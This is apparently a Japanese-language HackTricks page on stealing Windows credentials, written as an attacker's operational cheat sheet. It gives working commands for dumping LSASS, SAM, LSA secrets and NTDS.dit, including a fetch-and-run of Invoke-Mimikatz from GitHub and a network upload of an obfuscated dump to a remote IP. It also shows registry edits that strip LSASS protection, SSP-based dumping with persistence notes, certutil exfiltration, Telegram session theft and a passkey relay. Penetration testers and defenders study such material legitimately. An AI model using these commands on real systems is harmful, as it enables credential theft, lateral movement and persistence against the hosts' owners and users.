# Windows認証情報の窃取

{{#include ../../banners/hacktricks-training.md}}

## 認証情報 Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatzでできるその他のことは** [**このページ**](credentials-mimikatz.md)**で確認してください。**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**ここで、考えられる認証情報の保護策について確認できます。**](credentials-protections.md) **これらの保護策により、Mimikatzによる一部の認証情報の抽出を防げる可能性があります。**

## Credentials with Meterpreter

私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)を使って、被害者のシステム内の**パスワードとハッシュを検索**します。

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AVの回避

### Procdump + Mimikatz

**Procdumpは**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**の正規のMicrosoftツールなので**、Defenderには検知されません。\
このツールを使って**lsassプロセスをダンプ**し、**ダンプをダウンロード**して、ダンプから**認証情報をローカルで抽出**できます。

[SharpDump](https://github.com/GhostPack/SharpDump)も使用できます。

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) を使って自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: **AV** によっては、**procdump.exe を使った lsass.exe のダンプ**が**悪意のあるものとして検出**される場合があります。これは、**「procdump.exe」と「lsass.exe」という文字列を検出**しているためです。そのため、**lsass.exe という名前の代わりに、lsass.exe の PID を引数として procdump に渡す**ほうが、より**ステルス性が高く**なります。

### **comsvcs.dll** を使った lsass のダンプ

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ時に**プロセスメモリをダンプ**する役割を担っています。この DLL には **`MiniDumpW`** という**関数**が含まれており、`rundll32.exe` を使って呼び出すように設計されています。\
最初の2つの引数は何を指定しても問題ありませんが、3つ目の引数は3つの要素で構成されます。ダンプするプロセスの ID が1つ目の要素、ダンプファイルの保存先が2つ目、3つ目は **full** という単語で固定です。他のオプションはありません。\
この3つの要素が解析されると、DLL はダンプファイルを作成し、指定したプロセスのメモリをそのファイルに転送します。\
**comsvcs.dll** を使って lsass プロセスをダンプすれば、procdump をアップロードして実行する必要がなくなります。この手法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。<sup>[[9]](#references)</sup>

実行には、次のコマンドを使用します:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Task Managerでlsassをダンプする**

1. タスクバーを右クリックし、Task Managerをクリックします
2. More detailsをクリックします
3. Processesタブで「Local Security Authority Process」プロセスを探します
4. 「Local Security Authority Process」プロセスを右クリックし、「Create dump file」をクリックします

### procdumpでlsassをダンプする

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートに含まれるMicrosoft署名済みバイナリです。

既存のシステム全体のクラッシュダンプや、アクセス可能なユーザーフォルダーにある圧縮コピーに、オフライン分析用の認証情報が残っている場合があります。`MEMORY.DMP`や`MEMORY.7z`のようなファイル名は、調査の手掛かりにすぎません。出所とアクセス権を確認し、利用可能または有効な認証情報が含まれていると決めつけないでください。

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## VM snapshotからのオフライン認証情報抽出

読み取り可能なVMバックアップには、実行中のゲストやLSASSにアクセスできなくても、保存された**ゲストメモリイメージ**が含まれている場合があります。VMwareでは、`.vmsn`スナップショットメタデータと、存在する場合は対応する`.vmem`を特定します。どちらも`.vmdk`ディスクイメージと混同しないでください。`VMkatz`はスナップショットまたはVMディレクトリを入力として解析し、ゲストメモリからハッシュやチケットなどの[Windowsログオンセッション認証情報](credentials-mimikatz.md)を復元できます。また、仮想ディスクを調べてSAM/LSAの情報を取得することもできます。前提となるのはバックアップファイルへのアクセスであり、稼働中のVMに対するデバッグ権限ではありません。<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Checkpointの例では、standalone VM snapshotから**ローカル**Administrator NT hashを復元しました。ドメインに対する認証に成功したのは、別途パスワードの再利用が確認された後です。バックアップから取得したローカルhashが、そのままドメインの認証情報になるわけではありません。メモリに制約のあるホストでは、VMkatzがページを段階的にスキャンして解放することがありますが、snapshotをより大容量の解析用ホストにコピーするほうが適切な場合もあります。<sup>[[17]](#references)[[18]](#references)</sup>

## PPLBladeでlsassをdumpする

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)は、memory dumpの難読化と、ディスクに保存せずにリモートワークステーションへ転送する機能を備えたProtected Process Dumper Toolです。

**主な機能**:

1. PPL protectionのバイパス
2. Defenderのsignature-based detection mechanismsを回避するためのmemory dump filesの難読化
3. ディスクに保存せずにRAWおよびSMBのupload methodsでmemory dumpをアップロード（fileless dump）

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump を使わない SSP ベースの LSASS dump

Ink Dragon は、`MiniDumpWriteDump` を一度も呼び出さない 3 段階の dumper、**LalsDumper** を使用します。そのため、この API に対する EDR の hook は一切発動しません:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` 内で小文字の `d` 32 文字からなる placeholder を検索し、`rtu.txt` の絶対パスで上書きします。パッチ済み DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより、**LSASS** は悪意のある DLL を新しい Security Support Provider (SSP) としてロードします。
2. **LSASS 内の Stage 2** – LSASS が `nfdp.dll` をロードすると、DLL は `rtu.txt` を読み込み、各 byte を `0x20` で XOR し、復号した blob をメモリに map してから実行を引き渡します。
3. **Stage 3 dumper** – map された payload は、hash 化された API 名から解決した **direct syscalls** (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`) を使って MiniDump のロジックを再実装します。専用の export `Tom` は `%TEMP%\<pid>.ddt` を開き、圧縮した LSASS dump をファイルに書き込み、handle を閉じます。これにより、後から exfiltration を実行できます。

オペレーター向けメモ:

* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt` は同じディレクトリに置いてください。Stage 1 はハードコードされた placeholder を `rtu.txt` の絶対パスで書き換えるため、ファイルを分けると一連の処理が中断します。
* 登録は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を追加して行います。この値を手動で設定しておけば、起動のたびに LSASS が SSP を再ロードするようにできます。
* `%TEMP%\*.ddt` ファイルは圧縮された dump です。ローカルで解凍してから、Mimikatz/Volatility に渡して認証情報を抽出します。
* `AddSecurityPackageA` を成功させるには、`lals.exe` の実行に admin/SeTcb 権限が必要です。呼び出しが戻ると、LSASS は不正な SSP を透過的にロードし、Stage 2 を実行します。
* DLL をディスクから削除しても、LSASS からは排除されません。レジストリのエントリを削除して LSASS を再起動する（再起動する）か、長期的な persistence のために残しておいてください。

## CrackMapExec

### SAM hashes の Dump

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA secrets のダンプ

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### 対象DCからNTDS.ditをDumpする

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### target DCからNTDS.ditのパスワード履歴をDumpする

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### 各NTDS.ditアカウントのpwdLastSet属性を表示する

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM & SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM_ に**配置**されています。ただし、保護されているため、通常の方法でコピーすることはできません。

### Registry から

これらのファイルを窃取する最も簡単な方法は、Registry からコピーを取得することです。

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

それらのファイルをKaliマシンに**ダウンロード**し、以下を使って**ハッシュを抽出**します:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### ボリューム シャドウ コピー

このサービスを使用して、保護されたファイルをコピーできます。Administrator 権限が必要です。

#### vssadmin を使用する

vssadmin バイナリは Windows Server バージョンでのみ利用できます。

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

ただし、**Powershell**からも同じことができます。以下は**SAM fileをコピーする方法**の例です（使用するハードドライブは「C:」で、C:\users\Publicに保存します）。ただし、これは保護されたファイルなら何でもコピーするのに使えます。

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

書籍のコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使って、SAM、SYSTEM、ntds.ditのコピーを作成することもできます。

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** ファイルは **Active Directory** の中核として知られ、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースであり、**_%SystemRoom%/NTDS/ntds.dit_** にあります。

このデータベースには、主に次の 3 つのテーブルが保持されています。

- **Data Table**: ユーザーやグループなどのオブジェクトに関する詳細を保存します。
- **Link Table**: グループメンバーシップなどの関係を記録します。
- **SD Table**: 各オブジェクトの **Security descriptors** を保持し、保存されたオブジェクトのセキュリティとアクセス制御を確保します。

Christoffer Andersson によるデータベース層の調査では、これらのテーブルとバージョンごとの挙動がさらに詳しく記録されています。<sup>[[8]](#references)</sup>

Windows はこのファイルとのやり取りに _Ntdsa.dll_ を使用し、_lsass.exe_ がこれを利用します。そのため、**NTDS.dit** ファイルの**一部**が **`lsass`** メモリ内に存在する場合があります（パフォーマンス向上のために **cache** が使われており、おそらく直近にアクセスされたデータを確認できます）。

#### NTDS.dit 内の hash を復号する

hash は 3 回復号されます。

1. **BOOTKEY** と **RC4** を使って Password Encryption Key (**PEK**) を復号する。
2. **PEK** と **RC4** を使って **hash** を復号する。
3. **DES** を使って **hash** を復号する。

**PEK** はすべてのドメインコントローラーで**同じ値**ですが、各ドメインコントローラーの **SYSTEM** hive にある、その DC 固有の **BOOTKEY** で **NTDS.dit** 内に**暗号化**されています。したがって、資格情報を抽出するには **NTDS.dit** と **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) の両方が必要です。

別の [kernel handle-table redirection technique](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) を使うと、VSS を使わずに、すでに開かれている NTDS file object をコピーできます。ただし、ドメインコントローラー上で任意の kernel read/write primitive が必要です。<sup>[[16]](#references)</sup>

### Ntdsutil を使用した NTDS.dit のコピー

Windows Server 2008 以降で利用できます。

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

[**volume shadow copy**](#stealing-sam-and-system) の手法を使って **ntds.dit** ファイルをコピーすることもできます。また、**SYSTEM file** のコピーも必要になることを忘れないでください（同じく、[**レジストリからダンプするか、volume shadow copy を使う**](#stealing-sam-and-system)手法を利用できます）。

### **NTDS.dit からハッシュを抽出する**

**NTDS.dit** ファイルと **SYSTEM** ファイルを**取得したら**、_secretsdump.py_ などのツールを使って**ハッシュを抽出**できます：

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

有効なドメイン管理者ユーザーを使用して、自動的に**抽出**することもできます:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**大きな NTDS.dit ファイル**は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使って抽出することをおすすめします。

最後に、**metasploit module** `post/windows/gather/credentials/domain_hashdump` または **mimikatz** `lsadump::lsa /inject` も使用できます。

### **NTDS.dit からドメインオブジェクトを SQLite データベースに抽出する**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使うと、NTDS オブジェクトを SQLite データベースに抽出できます。シークレットだけでなくオブジェクト全体とその属性も抽出されるため、NTDS.dit ファイルをすでに取得している場合は、さらに情報を抽出できます。

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hiveは任意ですが、シークレットの復号に使用できます（NTおよびLMハッシュ、平文パスワードなどの補助資格情報、Kerberosキーまたはtrustキー、NTおよびLMパスワード履歴）。その他の情報とともに、次のデータが抽出されます：ハッシュを含むユーザーおよびマシンアカウント、UACフラグ、最終ログオン日時とパスワード変更日時、アカウントの説明、名前、UPN、SPN、グループと再帰的なメンバーシップ、組織単位のツリーとメンバーシップ、trustの種類、方向、属性を含む信頼済みドメイン...

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)からバイナリをダウンロードしてください。このバイナリを使って、複数のソフトウェアから資格情報を抽出できます。

```
lazagne.exe all
```

## SAM と LSASS から認証情報を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールはメモリから認証情報を抽出するために使用できます。次からダウンロードしてください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM ファイルから認証情報を抽出する

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAMファイルから資格情報を抽出する

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

ここからダウンロードしてください：[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)。そのまま**実行**すれば、パスワードが抽出されます。

## アイドル状態のRDPセッションの調査とセキュリティ制御の弱体化

Ink DragonのFinalDraft RATには、どのred-teamerにとっても役立つ手法を含む`DumpRDPHistory` taskerがあります:<sup>[[3]](#references)</sup>

### DumpRDPHistory式のテレメトリ収集

* **外向きのRDP接続先** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`にあるすべてのユーザーハイブを解析します。各サブキーにはサーバー名、`UsernameHint`、最終書き込み時刻が保存されています。PowerShellを使えば、FinalDraftのロジックを再現できます:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Inbound RDP の証拠** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログで Event ID **21**（ログオン成功）と **25**（切断）を検索し、誰がそのホストを管理していたかを特定します:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Domain Adminが定期的に接続していることが分かったら、そのユーザーの**切断済み**セッションがまだ存在する間に、LalsDumper/MimikatzでLSASSをダンプします。CredSSP + NTLMフォールバックにより、検証情報とトークンがLSASSに残るため、それらをSMB/WinRM経由でリプレイして`NTDS.dit`を取得したり、ドメインコントローラー上に永続化を仕掛けたりできます。

### FinalDraftが標的とするレジストリのダウングレード

同じimplantは、認証情報の窃取を容易にするため、複数のレジストリキーも改ざんします。<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` は受信 RDP の Restricted Admin を無効にします。このモードで pass-the-hash を有効にするものではありません。値を `0` に設定すると接続先で Restricted Admin が許可されますが、クライアント側で `/RestrictedAdmin` を要求するか、Restricted Admin を必須とするポリシーを使用する必要があります。<sup>[[14]](#references)</sup> ハッシュだけではリモート管理者権限は得られません。[RDP 認証の前提条件](../../network-services-pentesting/pentesting-rdp.md)を参照してください。<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` は UAC トークンフィルタリングを無効にし、ローカル管理者がネットワーク経由で制限のないトークンを取得できるようにします。
* `DSRMAdminLogonBehavior=2` は DC がオンラインのときに DSRM 管理者のログオンを許可し、攻撃者に別の組み込み高権限アカウントを与えます。
* `RunAsPPL=0` は LSASS PPL による保護を解除し、LalsDumper などのダンプツールによるメモリへのアクセスを容易にします。

## hMailServer の設定資格情報（侵害後）

インストール構成に応じて、正確な設定ファイル `C:\Program Files\hMailServer\Bin\hMailServer.ini`、`C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`、`C:\ProgramData\hMailServer\hMailServer.ini` を確認してください。読み取り可能で空ではない `[Security] AdministratorPassword=` の値は、hMailServer の管理者パスワードハッシュです。Windows Administrator のパスワードを示すものではありません。この資格情報を回収できても、Windows アカウントへのピボットには、パスワードの再利用とログオン権限をそれぞれ独立して確認する必要があります。

SQL CE データベースを使用するインストールでは、INI 内の別の `[Database] Password=` の値がデータベースを保護します。レガシーなインストールでは、この値は固定キー `THIS_KEY_IS_NOT_SECRET` と 4 バイトワード単位のエンディアン入れ替えを使って Blowfish で暗号化されています。INI の 16 進文字列を使い、次の Python スニペットを実行してください。<sup>[[2]](#references)</sup>

現在のアカウントで INI と対応する SQL CE `.sdf` データベースの**両方**を読み取れることを、まず確認してください。INI のパスワードはデータベースを保護するものであり、データベース内に保存されているメールボックスアカウントのハッシュとは別のものです。使用中のデータベースを調査またはアップグレードする場合は、稼働中のファイルではなく、必ず**コピー**を使用してください。

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

平文パスワードを使って、ファイルロックを回避するためにSQL CEデータベースをコピーし、32-bit providerを読み込んで、必要に応じてアップグレードしてからハッシュを照会します。

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` 列では hMailServer のハッシュ形式（hashcat mode `1421`）が使われます。クラックしたメールボックスのパスワードが Windows user pivot になるのは、そのパスワードがローカルまたはドメインアカウントで再利用されており、そのアカウントに必要なリモートログオン権限がある場合に限られます。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部のツールは、LSA ログオンコールバック `LsaApLogonUserEx2` をインターセプトして**平文のログオンパスワード**を取得します。認証パッケージのコールバックを hook するかラップして、認証情報を**ログオン中**（ハッシュ化前）に取得し、ディスクに書き込むかオペレーターに返す仕組みです。一般に、LSA にインジェクトするか LSA に登録するヘルパーとして実装され、成功した対話型またはネットワークログオンイベントごとに、ユーザー名、ドメイン、パスワードを記録します。<sup>[[1]](#references)</sup>

運用上の注意:
- 認証パスにヘルパーを読み込むには、ローカル管理者または SYSTEM 権限が必要です。
- 取得した認証情報が現れるのはログオンが発生したときだけです（hook に応じて、対話型、RDP、サービス、またはネットワークログオン）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、保存済みの接続情報をユーザーごとの `sqlstudio.bin` ファイルに保存します。専用の dumper を使うと、このファイルを解析して保存済みの SQL 認証情報を復元できます。コマンド出力しか返せない shell では、ファイルを Base64 にエンコードして stdout に出力し、外部に持ち出す方法がよく使われます。<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

オペレーター側でファイルを再構築し、ローカルでdumperを実行して認証情報を復元します：

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Chrome DevTools Protocolを介したブラウザーセッションおよびcookieの窃取

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktopの` tdata`セッション窃取

Telegram Desktopは、認証情報とアカウント状態を**`tdata`**ディレクトリに保存します。コピーしたセッションは、互換性のあるツールで読み込むことで、認証が有効な間、アカウントのパスワードなしで認証に使用できます。ローカルデータの暗号化が有効な場合、stealerはパスコードも必要とします。認証済みセッションからは、ID情報、ダイアログやメンバーシップのメタデータ、メッセージ、ダウンロード可能なメディアを取得できます。<sup>[[10]](#references)</sup>

### 発見と取得

インストール版とポータブル版の両方の配置を検索します。Microsoft Storeのパッケージ名は異なるため、`TelegramMessenge`を含むパッケージディレクトリを列挙し、その`LocalCache\Roaming`サブツリーを調べます。<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

通常の読み取りに失敗し、プロセストークンに `SeBackupPrivilege` が**すでに含まれ、有効化されている**場合、バックアップ対応のアクセスが代替手段になります。ただし、これによって特権が取得されたり、プロセスが昇格したりするわけではありません。`FILE_FLAG_BACKUP_SEMANTICS` を指定した `CreateFileW` は、必要なトークン特権がある場合にバックアップ／復元セマンティクスを要求し、ファイルのセキュリティチェックを回避できます。ただし、このフラグだけでは、共有を妨げるロックは解除できません。<sup>[[10]](#references)[[11]](#references)</sup>

使用中でロックされたファイルには **Volume Shadow Copy** を作成して読み取ります。ACL によってアクセスが拒否されるファイルには、`robocopy /B` を使うとバックアップモードで動作し、ファイルとディレクトリの ACL を回避できます。<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

帯域幅を意識した implant は、まずファイルパスの一覧だけを送信し、スナップショット識別子と、C2 にすでに保存されているパスを受け取ってから、不足しているファイルだけをアップロードする場合があります。そのため、`tdata` を再帰的に列挙した後に少量の差分転送が行われていても、セッション窃取が成功している可能性があります。<sup>[[10]](#references)</sup>

### 検知と封じ込め

Telegram 以外のプロセスによる `tdata` への再帰的なアクセスを、`SeBackupPrivilege` の有効化、backup semantics を指定したファイルオープン、VSS のアクティビティ、または `/B` を使用する子プロセス `robocopy.exe` と相関させます。また、`%APPDATA%` と `%LOCALAPPDATA%\Packages` の両方を素早く列挙した後、同じプロセスから外部への接続が発生していないかも調査します。侵害後は、**設定 → デバイス**（または **プライバシーとセキュリティ → アクティブなセッション**）を使って、見覚えのないセッションを終了します。2 段階認証を有効にしても、すでに盗まれた認証を無効にはできません。<sup>[[10]](#references)[[13]](#references)</sup>

## Windows 上の Chrome からの Passkeys / WebAuthn 認証情報の窃取

**Chrome + Google Password Manager で同期された passkeys** を使用している Windows ホストで、**victim user** としてコード実行できた場合、管理者権限や SYSTEM 権限がなくても、passkeys は興味深い post-exploitation の標的になります。<sup>[[4]](#references)</sup>

### 興味深いローカルアーティファクト

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** にはprotobufでエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されます。同じユーザー権限で動作するプロセスは、同期されたpasskeyの **RP ID**、**ユーザー名**、**credential ID**、暗号化された秘密鍵のマテリアルを列挙できます。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** や、同期された認証情報の復元に使用されるラップ済みシークレットなど、ローカルデバイスの登録状態が保存されます。<sup>[[4]](#references)</sup>

簡易トリアージ:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-bound key blobs はローカルの signing oracle として悪用できる

ブラウザーが TPM-backed identity key を **`NCRYPT_OPAQUE_KEY_BLOB`** としてエクスポートし、その blob をユーザーがアクセス可能な状態に保存している場合、マルウェアは raw private key を抽出する必要は**ありません**。同じマシン上で blob を再インポートし、ローカル TPM に攻撃者が制御するデータへの署名を要求するだけで済みます:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

これは、**hardware bindingによってデバイス外へのエクスポートは防げても、侵害されたエンドポイント上で同じユーザーが使用することは防げない**ことを意味します。

### 実際に悪用する方法

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - ChromeのLevelDBから`WebauthnCredentialSpecifics`を列挙する。
   - passkeyログインを開始し、新しいWebAuthn challengeを取得する。
   - 盗んだ`wrapped_identity_private_key` blobを被害者のTPM上で使用し、cloud-authenticatorリクエストのbindingに署名する。
   - 返されたassertionをrelying partyに中継する。
